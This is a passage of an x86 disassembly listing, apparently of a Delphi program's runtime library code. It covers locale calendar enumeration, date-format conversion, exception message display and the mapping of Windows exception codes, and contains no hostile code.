sub_413804	proc near		; DATA XREF: sub_41387C+77o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	0
		push	ebx
		push	esi
		xor	eax, eax
		push	ebp
		push	offset loc_413869
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	esi, esi
		mov	ebx, 1
		jmp	short loc_413828
; ---------------------------------------------------------------------------

loc_413822:				; CODE XREF: sub_413804+2Cj
		cmp	ebx, 7
		jz	short loc_413853
		inc	ebx

loc_413828:				; CODE XREF: sub_413804+1Cj
		cmp	ds:dword_4177E0[ebx*4],	0FFFFFFFFh
		jnz	short loc_413822
		lea	eax, [ebp+var_4]
		mov	edx, [ebp+arg_0]
		call	sub_403B8C
		mov	eax, [ebp+var_4]
		xor	edx, edx
		call	sub_412998
		mov	ds:dword_4177E0[ebx*4],	eax
		mov	esi, 1

loc_413853:				; CODE XREF: sub_413804+21j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_413870

loc_413860:				; CODE XREF: sub_413804+6Aj
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_413869:				; DATA XREF: sub_413804+Ao
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_413860
; ---------------------------------------------------------------------------

loc_413870:				; CODE XREF: sub_413804+64j
					; DATA XREF: sub_413804+57o
		mov	eax, esi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	4
sub_413804	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41387C	proc near		; CODE XREF: sub_4149B8+31p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	0
		push	esi
		xor	eax, eax
		push	ebp
		push	offset loc_413913
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	eax, [ebp+var_4]
		push	eax
		call	GetThreadLocale_0
		mov	ecx, offset dword_413928
		mov	edx, 100Bh
		call	sub_4135F4
		mov	eax, [ebp+var_4]
		mov	edx, 1
		call	sub_412998
		mov	esi, eax
		mov	eax, esi
		add	eax, 0FFFFFFFDh
		sub	eax, 3
		jnb	short loc_4138FD
		push	4		; CalType
		push	esi		; Calendar
		call	GetThreadLocale_0
		push	eax		; Locale
		push	offset CalInfoEnumProc ; lpCalInfoEnumProc
		call	EnumCalendarInfoA
		mov	edx, 7
		mov	eax, offset dword_4177E4

loc_4138DE:				; CODE XREF: sub_41387C+6Cj
		mov	dword ptr [eax], 0FFFFFFFFh
		add	eax, 4
		dec	edx
		jnz	short loc_4138DE
		push	3		; CalType
		push	esi		; Calendar
		call	GetThreadLocale_0
		push	eax		; Locale
		push	offset sub_413804 ; lpCalInfoEnumProc
		call	EnumCalendarInfoA

loc_4138FD:				; CODE XREF: sub_41387C+43j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_41391A

loc_41390A:				; CODE XREF: sub_41387C+9Cj
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_413913:				; DATA XREF: sub_41387C+9o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_41390A
; ---------------------------------------------------------------------------

loc_41391A:				; CODE XREF: sub_41387C+96j
					; DATA XREF: sub_41387C+89o
		pop	esi
		pop	ecx
		pop	ebp
		retn
sub_41387C	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 1
dword_413928	dd 31h			; DATA XREF: sub_41387C+1Do

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41392C	proc near		; CODE XREF: sub_4149B8+11Cp
					; sub_4149B8+149p

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	edi, edx
		mov	esi, eax
		xor	eax, eax
		push	ebp
		push	offset loc_413AF6
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	ebx, 1
		mov	eax, edi
		call	sub_403994
		lea	eax, [ebp+var_8]
		push	eax
		call	GetThreadLocale_0
		mov	ecx, offset dword_413B0C
		mov	edx, 1009h
		call	sub_4135F4
		mov	eax, [ebp+var_8]
		mov	edx, 1
		call	sub_412998
		add	eax, 0FFFFFFFDh
		sub	eax, 3
		jb	loc_413ACC
		mov	eax, ds:dword_4177BC
		sub	eax, 4
		jz	short loc_41399E
		add	eax, 0FFFFFFF3h
		sub	eax, 2
		jb	short loc_41399E
		xor	eax, eax
		jmp	short loc_4139A0
; ---------------------------------------------------------------------------

loc_41399E:				; CODE XREF: sub_41392C+64j
					; sub_41392C+6Cj
		mov	al, 1

loc_4139A0:				; CODE XREF: sub_41392C+70j
		test	al, al
		jz	short loc_4139D9
		jmp	short loc_4139C9
; ---------------------------------------------------------------------------

loc_4139A6:				; CODE XREF: sub_41392C+A6j
		mov	al, [esi+ebx-1]
		sub	al, 47h
		jz	short loc_4139C8
		sub	al, 20h
		jz	short loc_4139C8
		lea	eax, [ebp+var_C]
		mov	dl, [esi+ebx-1]
		call	sub_403B7C
		mov	edx, [ebp+var_C]
		mov	eax, edi
		call	sub_403C2C

loc_4139C8:				; CODE XREF: sub_41392C+80j
					; sub_41392C+84j
		inc	ebx

loc_4139C9:				; CODE XREF: sub_41392C+78j
		mov	eax, esi
		call	sub_403C24
		cmp	ebx, eax
		jle	short loc_4139A6
		jmp	loc_413ADB
; ---------------------------------------------------------------------------

loc_4139D9:				; CODE XREF: sub_41392C+76j
		mov	eax, edi
		mov	edx, esi
		call	sub_4039E8
		jmp	loc_413ADB
; ---------------------------------------------------------------------------

loc_4139E7:				; CODE XREF: sub_41392C+1A9j
		mov	al, [esi+ebx-1]
		and	eax, 0FFh
		bt	ds:dword_416B38, eax
		jnb	short loc_413A27
		mov	edx, ebx
		mov	eax, esi
		call	sub_4146B4
		mov	[ebp+var_4], eax
		lea	eax, [ebp+var_10]
		push	eax
		mov	ecx, [ebp+var_4]
		mov	edx, ebx
		mov	eax, esi
		call	sub_403E84
		mov	edx, [ebp+var_10]
		mov	eax, edi
		call	sub_403C2C
		add	ebx, [ebp+var_4]
		jmp	loc_413ACC
; ---------------------------------------------------------------------------

loc_413A27:				; CODE XREF: sub_41392C+CBj
		mov	edx, offset dword_413B10
		lea	eax, [esi+ebx-1]
		mov	ecx, 2
		call	sub_412B44
		test	eax, eax
		jnz	short loc_413A4D
		mov	eax, edi
		mov	edx, offset dword_413B1C
		call	sub_403C2C
		inc	ebx
		jmp	short loc_413ACB
; ---------------------------------------------------------------------------

loc_413A4D:				; CODE XREF: sub_41392C+110j
		mov	edx, offset aYyyy ; "yyyy"
		lea	eax, [esi+ebx-1]
		mov	ecx, 4
		call	sub_412B44
		test	eax, eax
		jnz	short loc_413A75
		mov	eax, edi
		mov	edx, offset aEeee ; "eeee"
		call	sub_403C2C
		add	ebx, 3
		jmp	short loc_413ACB
; ---------------------------------------------------------------------------

loc_413A75:				; CODE XREF: sub_41392C+136j
		mov	edx, offset aYy	; "yy"
		lea	eax, [esi+ebx-1]
		mov	ecx, 2
		call	sub_412B44
		test	eax, eax
		jnz	short loc_413A9B
		mov	eax, edi
		mov	edx, offset dword_413B44
		call	sub_403C2C
		inc	ebx
		jmp	short loc_413ACB
; ---------------------------------------------------------------------------

loc_413A9B:				; CODE XREF: sub_41392C+15Ej
		mov	al, [esi+ebx-1]
		sub	al, 59h
		jz	short loc_413AA7
		sub	al, 20h
		jnz	short loc_413AB5

loc_413AA7:				; CODE XREF: sub_41392C+175j
		mov	eax, edi
		mov	edx, offset dword_413B50
		call	sub_403C2C
		jmp	short loc_413ACB
; ---------------------------------------------------------------------------

loc_413AB5:				; CODE XREF: sub_41392C+179j
		lea	eax, [ebp+var_14]
		mov	dl, [esi+ebx-1]
		call	sub_403B7C
		mov	edx, [ebp+var_14]
		mov	eax, edi
		call	sub_403C2C

loc_413ACB:				; CODE XREF: sub_41392C+11Fj
					; sub_41392C+147j ...
		inc	ebx

loc_413ACC:				; CODE XREF: sub_41392C+56j
					; sub_41392C+F6j
		mov	eax, esi
		call	sub_403C24
		cmp	ebx, eax
		jle	loc_4139E7

loc_413ADB:				; CODE XREF: sub_41392C+A8j
					; sub_41392C+B6j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_413AFD

loc_413AE8:				; CODE XREF: sub_41392C+1CFj
		lea	eax, [ebp+var_14]
		mov	edx, 4
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_413AF6:				; DATA XREF: sub_41392C+14o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_413AE8
; ---------------------------------------------------------------------------

loc_413AFD:				; CODE XREF: sub_41392C+1C9j
					; DATA XREF: sub_41392C+1B7o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_41392C	endp

; ---------------------------------------------------------------------------
		dd 0FFFFFFFFh, 1
dword_413B0C	dd 31h			; DATA XREF: sub_41392C+34o
dword_413B10	dd 6767h, 0FFFFFFFFh, 3	; DATA XREF: sub_41392C:loc_413A27o
dword_413B1C	dd 676767h		; DATA XREF: sub_41392C+114o
aYyyy		db 'yyyy',0             ; DATA XREF: sub_41392C:loc_413A4Do
		align 4
		dd 0FFFFFFFFh, 4
aEeee		db 'eeee',0             ; DATA XREF: sub_41392C+13Ao
		align 4
aYy		db 'yy',0               ; DATA XREF: sub_41392C:loc_413A75o
		align 4
		dd 0FFFFFFFFh, 2
dword_413B44	dd 6565h, 0FFFFFFFFh, 1	; DATA XREF: sub_41392C+162o
dword_413B50	dd 65h			; DATA XREF: sub_41392C+17Do

; =============== S U B	R O U T	I N E =======================================


sub_413B54	proc near		; CODE XREF: sub_413B60+63p
		test	eax, eax
		jz	short locret_413B5D
		sub	eax, 1000h

locret_413B5D:				; CODE XREF: sub_413B54+2j
		retn
sub_413B54	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_413B60	proc near		; CODE XREF: sub_413CE8+Fp

var_458		= byte ptr -458h
var_358		= dword	ptr -358h
var_354		= byte ptr -354h
var_350		= dword	ptr -350h
var_34C		= byte ptr -34Ch
var_348		= dword	ptr -348h
var_344		= byte ptr -344h
var_340		= dword	ptr -340h
var_33C		= byte ptr -33Ch
var_338		= dword	ptr -338h
var_334		= byte ptr -334h
Buffer		= _MEMORY_BASIC_INFORMATION ptr	-330h
var_312		= byte ptr -312h
Filename	= byte ptr -212h
var_10D		= byte ptr -10Dh
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFBA8h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_4], ecx
		mov	ebx, edx
		mov	esi, eax
		push	1Ch		; dwLength
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		push	ebx		; lpAddress
		call	VirtualQuery
		cmp	[ebp+Buffer.State], 1000h
		jnz	short loc_413BAA
		push	105h		; nSize
		lea	eax, [ebp+Filename]
		push	eax		; lpFilename
		mov	eax, [ebp+Buffer.AllocationBase]
		push	eax		; hModule
		call	GetModuleFileNameA_0
		test	eax, eax
		jnz	short loc_413BCD

loc_413BAA:				; CODE XREF: sub_413B60+2Cj
		push	105h		; nSize
		lea	eax, [ebp+Filename]
		push	eax		; lpFilename
		mov	eax, ds:hModule
		push	eax		; hModule
		call	GetModuleFileNameA_0
		mov	eax, ebx
		call	sub_413B54
		mov	[ebp+var_8], eax
		jmp	short loc_413BD6
; ---------------------------------------------------------------------------

loc_413BCD:				; CODE XREF: sub_413B60+48j
		sub	ebx, [ebp+Buffer.AllocationBase]
		mov	[ebp+var_8], ebx

loc_413BD6:				; CODE XREF: sub_413B60+6Bj
		lea	eax, [ebp+Filename]
		mov	dl, 5Ch
		call	sub_4146F0
		mov	edx, eax
		inc	edx
		lea	eax, [ebp+var_10D]
		mov	ecx, 104h
		call	sub_412AEC
		mov	ebx, offset dword_413CE0
		mov	edi, offset dword_413CE0
		mov	eax, esi
		mov	edx, off_411E2C
		call	sub_402D9C
		test	al, al
		jz	short loc_413C32
		mov	eax, [esi+4]
		call	sub_403E24
		mov	ebx, eax
		mov	eax, ebx
		call	sub_412AC4
		test	eax, eax
		jz	short loc_413C32
		cmp	byte ptr [ebx+eax-1], 2Eh
		jz	short loc_413C32
		mov	edi, offset dword_413CE4

loc_413C32:				; CODE XREF: sub_413B60+AFj
					; sub_413B60+C4j ...
		push	100h		; cchBufferMax
		lea	eax, [ebp+var_312]
		push	eax		; lpBuffer
		mov	eax, ds:off_416E70
		mov	eax, [eax+4]
		push	eax		; uID
		mov	eax, ds:hModule
		call	sub_4047D0
		push	eax		; hInstance
		call	LoadStringA_0
		lea	edx, [ebp+var_458]
		mov	eax, [esi]
		call	sub_402CBC
		lea	eax, [ebp+var_458]
		mov	[ebp+var_358], eax
		mov	[ebp+var_354], 4
		lea	eax, [ebp+var_10D]
		mov	[ebp+var_350], eax
		mov	[ebp+var_34C], 6
		mov	eax, [ebp+var_8]
		mov	[ebp+var_348], eax
		mov	[ebp+var_344], 5
		mov	[ebp+var_340], ebx
		mov	[ebp+var_33C], 6
		mov	[ebp+var_338], edi
		mov	[ebp+var_334], 6
		lea	eax, [ebp+var_358]
		push	eax
		push	4
		lea	ecx, [ebp+var_312]
		mov	edx, [ebp+arg_0]
		mov	eax, [ebp+var_4]
		call	sub_412F9C
		mov	eax, [ebp+var_4]
		call	sub_412AC4
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_413B60	endp

; ---------------------------------------------------------------------------
		align 10h
dword_413CE0	dd 0			; DATA XREF: sub_413B60+96o
					; sub_413B60+9Bo
dword_413CE4	dd 2Eh			; DATA XREF: sub_413B60+CDo

; =============== S U B	R O U T	I N E =======================================


sub_413CE8	proc near		; CODE XREF: CODE:loc_41445Cp

NumberOfBytesWritten= dword ptr	-444h
Caption		= byte ptr -440h
pDst		= byte ptr -400h

		add	esp, 0FFFFFBBCh
		push	400h
		lea	ecx, [esp+448h+pDst]
		call	sub_413B60
		mov	eax, ds:off_416E28
		cmp	byte ptr [eax],	0
		jz	short loc_413D64
		mov	eax, ds:off_416D80
		call	sub_4026EC
		call	sub_402614
		lea	eax, [esp+444h+pDst]
		push	eax		; pDst
		lea	eax, [esp+448h+pDst]
		push	eax		; pSrc
		call	CharToOemA
		push	0		; lpOverlapped
		lea	eax, [esp+448h+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [esp+44Ch+pDst]
		call	sub_412AC4
		push	eax		; nNumberOfBytesToWrite
		lea	eax, [esp+450h+pDst]
		push	eax		; lpBuffer
		push	0FFFFFFF4h	; nStdHandle
		call	GetStdHandle_0
		push	eax		; hFile
		call	WriteFile_0
		push	0		; lpOverlapped
		lea	eax, [esp+448h+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	2		; nNumberOfBytesToWrite
		push	offset dword_413DAC ; lpBuffer
		push	0FFFFFFF4h	; nStdHandle
		call	GetStdHandle_0
		push	eax		; hFile
		call	WriteFile_0
		jmp	short loc_413D9A
; ---------------------------------------------------------------------------

loc_413D64:				; CODE XREF: sub_413CE8+1Cj
		push	40h		; cchBufferMax
		lea	eax, [esp+448h+Caption]
		push	eax		; lpBuffer
		mov	eax, ds:off_416D60
		mov	eax, [eax+4]
		push	eax		; uID
		mov	eax, ds:hModule
		call	sub_4047D0
		push	eax		; hInstance
		call	LoadStringA_0
		push	2010h		; uType
		lea	eax, [esp+448h+Caption]
		push	eax		; lpCaption
		lea	eax, [esp+44Ch+pDst]
		push	eax		; lpText
		push	0		; hWnd
		call	MessageBoxA_0

loc_413D9A:				; CODE XREF: sub_413CE8+7Aj
		add	esp, 444h
		retn
sub_413CE8	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 2
dword_413DAC	dd 0A0Dh		; DATA XREF: sub_413CE8+68o

; =============== S U B	R O U T	I N E =======================================


sub_413DB0	proc near		; CODE XREF: sub_413F68+32p
					; sub_413FE8+38p ...
		push	ebx
		push	esi
		push	edi
		test	dl, dl
		jz	short loc_413DBF
		add	esp, 0FFFFFFF0h
		call	sub_402E40

loc_413DBF:				; CODE XREF: sub_413DB0+5j
		mov	esi, ecx
		mov	ebx, edx
		mov	edi, eax
		lea	eax, [edi+4]
		mov	edx, esi
		call	sub_4039E8
		mov	eax, edi
		test	bl, bl
		jz	short loc_413DE4
		call	sub_402E98
		pop	large dword ptr	fs:0
		add	esp, 0Ch

loc_413DE4:				; CODE XREF: sub_413DB0+23j
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_413DB0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_413DEC	proc near		; CODE XREF: sub_41403C+77p
					; sub_4141C4+127p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	0
		push	ebx
		push	esi
		push	edi
		test	dl, dl
		jz	short loc_413E00
		add	esp, 0FFFFFFF0h
		call	sub_402E40

loc_413E00:				; CODE XREF: sub_413DEC+Aj
		mov	esi, ecx
		mov	ebx, edx
		mov	edi, eax
		xor	eax, eax
		push	ebp
		push	offset loc_413E46
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	eax, [ebp+var_4]
		push	eax
		mov	edx, [ebp+arg_4]
		mov	ecx, [ebp+arg_0]
		mov	eax, esi
		call	sub_412FDC
		mov	edx, [ebp+var_4]
		lea	eax, [edi+4]
		call	sub_4039E8
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_413E4D

loc_413E3D:				; CODE XREF: sub_413DEC+5Fj
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_413E46:				; DATA XREF: sub_413DEC+1Do
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_413E3D
; ---------------------------------------------------------------------------

loc_413E4D:				; CODE XREF: sub_413DEC+59j
					; DATA XREF: sub_413DEC+4Co
		mov	eax, edi
		test	bl, bl
		jz	short loc_413E62
		call	sub_402E98
		pop	large dword ptr	fs:0
		add	esp, 0Ch

loc_413E62:				; CODE XREF: sub_413DEC+65j
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	8
sub_413DEC	endp


; =============== S U B	R O U T	I N E =======================================


sub_413E6C	proc near		; CODE XREF: CODE:00414121p
					; sub_41446C+Dp ...
		push	ebx
		push	esi
		push	edi
		test	dl, dl
		jz	short loc_413E7B
		add	esp, 0FFFFFFF0h
		call	sub_402E40

loc_413E7B:				; CODE XREF: sub_413E6C+5j
		mov	esi, ecx
		mov	ebx, edx
		mov	edi, eax
		lea	edx, [edi+4]
		mov	eax, esi
		call	sub_404D54
		mov	eax, edi
		test	bl, bl
		jz	short loc_413EA0
		call	sub_402E98
		pop	large dword ptr	fs:0
		add	esp, 0Ch

loc_413EA0:				; CODE XREF: sub_413E6C+23j
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_413E6C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_413EA8	proc near		; CODE XREF: sub_412820+14p
					; sub_413F68+51p

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	ebx
		push	esi
		push	edi
		test	dl, dl
		jz	short loc_413EBE
		add	esp, 0FFFFFFF0h
		call	sub_402E40

loc_413EBE:				; CODE XREF: sub_413EA8+Cj
		mov	esi, ecx
		mov	ebx, edx
		mov	edi, eax
		xor	eax, eax
		push	ebp
		push	offset loc_413F14
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	eax, [ebp+var_4]
		push	eax
		lea	edx, [ebp+var_8]
		mov	eax, esi
		call	sub_404D54
		mov	eax, [ebp+var_8]
		mov	edx, [ebp+arg_4]
		mov	ecx, [ebp+arg_0]
		call	sub_412FDC
		mov	edx, [ebp+var_4]
		lea	eax, [edi+4]
		call	sub_4039E8
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_413F1B

loc_413F06:				; CODE XREF: sub_413EA8+71j
		lea	eax, [ebp+var_8]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_413F14:				; DATA XREF: sub_413EA8+1Fo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_413F06
; ---------------------------------------------------------------------------

loc_413F1B:				; CODE XREF: sub_413EA8+6Bj
					; DATA XREF: sub_413EA8+59o
		mov	eax, edi
		test	bl, bl
		jz	short loc_413F30
		call	sub_402E98
		pop	large dword ptr	fs:0
		add	esp, 0Ch

loc_413F30:				; CODE XREF: sub_413EA8+77j
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn	8
sub_413EA8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_413F3C	proc near		; DATA XREF: CODE:00411ED8o
					; CODE:00411F34o ...
		cmp	byte ptr [eax+0Ch], 0
		jz	short locret_413F47
		call	sub_402CEC

locret_413F47:				; CODE XREF: sub_413F3C+4j
		retn
sub_413F3C	endp

; ---------------------------------------------------------------------------
off_413F48	dd offset dword_413F4C	; DATA XREF: sub_41508C+50r
dword_413F4C	dd 4554090Eh, 726F7272h, 8636552h, 1000000h ; DATA XREF: CODE:off_413F48o
		db 3 dup(0)
		dd offset off_401018
		db 4
		align 8

; =============== S U B	R O U T	I N E =======================================


sub_413F68	proc near		; CODE XREF: sub_413FE8:loc_414029p

var_10		= dword	ptr -10h
var_C		= byte ptr -0Ch

		push	ebx
		push	esi
		add	esp, 0FFFFFFF8h
		xor	ebx, ebx
		call	sub_402644
		mov	esi, eax
		jmp	short loc_413F79
; ---------------------------------------------------------------------------

loc_413F78:				; CODE XREF: sub_413F68+1Dj
		inc	ebx

loc_413F79:				; CODE XREF: sub_413F68+Ej
		cmp	ebx, 6
		jg	short loc_413F87
		cmp	esi, ds:dword_416C18[ebx*8]
		jnz	short loc_413F78

loc_413F87:				; CODE XREF: sub_413F68+14j
		cmp	ebx, 6
		jg	short loc_413FA1
		mov	ecx, ds:dword_416C1C[ebx*8]
		mov	dl, 1
		mov	eax, off_411F4C
		call	sub_413DB0
		jmp	short loc_413FBE
; ---------------------------------------------------------------------------

loc_413FA1:				; CODE XREF: sub_413F68+22j
		mov	[esp+10h+var_10], esi
		mov	[esp+10h+var_C], 0
		push	esp
		push	0
		mov	ecx, ds:off_416D58
		mov	dl, 1
		mov	eax, off_411F4C
		call	sub_413EA8

loc_413FBE:				; CODE XREF: sub_413F68+37j
		mov	[eax+0Ch], esi
		pop	ecx
		pop	edx
		pop	esi
		pop	ebx
		retn
sub_413F68	endp

; ---------------------------------------------------------------------------
		align 4
off_413FC8	dd offset dword_413FCC	; DATA XREF: sub_41508C+3Br
dword_413FCC	dd 45540A0Eh, 70656378h, 63655274h, 8, 1 ; DATA	XREF: CODE:off_413FC8o
		dd offset off_401018
		dd 4

; =============== S U B	R O U T	I N E =======================================


sub_413FE8	proc near		; DATA XREF: sub_41446C+33o
		push	ebx
		mov	ebx, edx
		mov	edx, eax
		dec	dl
		jz	short loc_413FFD
		dec	dl
		jz	short loc_414005
		dec	edx
		sub	dl, 16h
		jb	short loc_41400D
		jmp	short loc_414029
; ---------------------------------------------------------------------------

loc_413FFD:				; CODE XREF: sub_413FE8+7j
		mov	edx, ds:dword_41780C
		jmp	short loc_414030
; ---------------------------------------------------------------------------

loc_414005:				; CODE XREF: sub_413FE8+Bj
		mov	edx, ds:dword_417810
		jmp	short loc_414030
; ---------------------------------------------------------------------------

loc_41400D:				; CODE XREF: sub_413FE8+11j
		and	eax, 0FFh
		lea	eax, dword_416C38[eax*8]
		mov	ecx, [eax+4]
		mov	eax, [eax]
		mov	dl, 1
		call	sub_413DB0
		mov	edx, eax
		jmp	short loc_414030
; ---------------------------------------------------------------------------

loc_414029:				; CODE XREF: sub_413FE8+13j
		call	sub_413F68
		mov	edx, eax

loc_414030:				; CODE XREF: sub_413FE8+1Bj
					; sub_413FE8+23j ...
		push	ebx
		mov	eax, edx
		jmp	sub_40336C
sub_413FE8	endp

; ---------------------------------------------------------------------------
		pop	ebx
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41403C	proc near		; CODE XREF: sub_4140F8+3p

var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= byte ptr -18h
var_14		= dword	ptr -14h
var_10		= byte ptr -10h
var_C		= dword	ptr -0Ch
var_8		= byte ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE0h
		push	ebx
		push	esi
		push	edi
		xor	ebx, ebx
		mov	[ebp+var_20], ebx
		mov	[ebp+var_4], ebx
		mov	edi, ecx
		mov	esi, edx
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_4140D8
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		test	ebx, ebx
		jz	short loc_414071
		lea	eax, [ebp+var_4]
		mov	edx, ebx
		call	sub_403A2C
		jmp	short loc_41407E
; ---------------------------------------------------------------------------

loc_414071:				; CODE XREF: sub_41403C+27j
		lea	edx, [ebp+var_4]
		mov	eax, ds:off_416E1C
		call	sub_404D54

loc_41407E:				; CODE XREF: sub_41403C+33j
		mov	eax, [ebp+var_4]
		mov	[ebp+var_1C], eax
		mov	[ebp+var_18], 0Bh
		mov	[ebp+var_14], esi
		mov	[ebp+var_10], 0Bh
		mov	[ebp+var_C], edi
		mov	[ebp+var_8], 0
		lea	eax, [ebp+var_1C]
		push	eax
		push	2
		lea	edx, [ebp+var_20]
		mov	eax, ds:off_416E3C
		call	sub_404D54
		mov	ecx, [ebp+var_20]
		mov	dl, 1
		mov	eax, off_412654
		call	sub_413DEC
		mov	ebx, eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4140DF

loc_4140C7:				; CODE XREF: sub_41403C+A1j
		lea	eax, [ebp+var_20]
		call	sub_403994
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_4140D8:				; DATA XREF: sub_41403C+1Ao
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4140C7
; ---------------------------------------------------------------------------

loc_4140DF:				; CODE XREF: sub_41403C+9Bj
					; DATA XREF: sub_41403C+86o
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_41403C	endp


; =============== S U B	R O U T	I N E =======================================


sub_4140E8	proc near		; CODE XREF: sub_4140F8+11p
		mov	esp, ecx
		mov	[esp+0], edx
		mov	ebp, [ebp+0]
		jmp	sub_40336C
sub_4140E8	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4140F8	proc near		; DATA XREF: sub_41446C+67o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		call	sub_41403C
		lea	ecx, [ebp+arg_0]
		add	ecx, 4
		mov	edx, [ebp+arg_0]
		call	sub_4140E8
		pop	ebp
		retn	4
sub_4140F8	endp

; ---------------------------------------------------------------------------
		align 4

loc_414114:				; DATA XREF: sub_41446C+74o
		mov	ecx, ds:off_416D74
		mov	dl, 1
		mov	eax, off_4126B4
		call	sub_413E6C
		call	sub_40336C
		retn

; =============== S U B	R O U T	I N E =======================================


sub_41412C	proc near		; CODE XREF: sub_4141AC+5p
					; sub_414390+20p
		mov	eax, [eax]
		cmp	eax, 0C0000092h
		jg	short loc_414161
		jz	short loc_414190
		cmp	eax, 0C000008Eh
		jg	short loc_414153
		jz	short loc_414193
		sub	eax, 0C0000005h
		jz	short loc_41419C
		sub	eax, 87h
		jz	short loc_41418A
		dec	eax
		jz	short loc_414199
		jmp	short loc_4141A8
; ---------------------------------------------------------------------------

loc_414153:				; CODE XREF: sub_41412C+10j
		add	eax, 3FFFFF71h
		sub	eax, 2
		jb	short loc_414190
		jz	short loc_414196
		jmp	short loc_4141A8
; ---------------------------------------------------------------------------

loc_414161:				; CODE XREF: sub_41412C+7j
		cmp	eax, 0C0000096h
		jg	short loc_414179
		jz	short loc_41419F
		sub	eax, 0C0000093h
		jz	short loc_414199
		dec	eax
		jz	short loc_414187
		dec	eax
		jz	short loc_41418D
		jmp	short loc_4141A8
; ---------------------------------------------------------------------------

loc_414179:				; CODE XREF: sub_41412C+3Aj
		sub	eax, 0C00000FDh
		jz	short loc_4141A5
		sub	eax, 3Dh
		jz	short loc_4141A2
		jmp	short loc_4141A8
; ---------------------------------------------------------------------------

loc_414187:				; CODE XREF: sub_41412C+46j
		mov	al, 3
		retn
; ---------------------------------------------------------------------------

loc_41418A:				; CODE XREF: sub_41412C+20j
		mov	al, 4
		retn
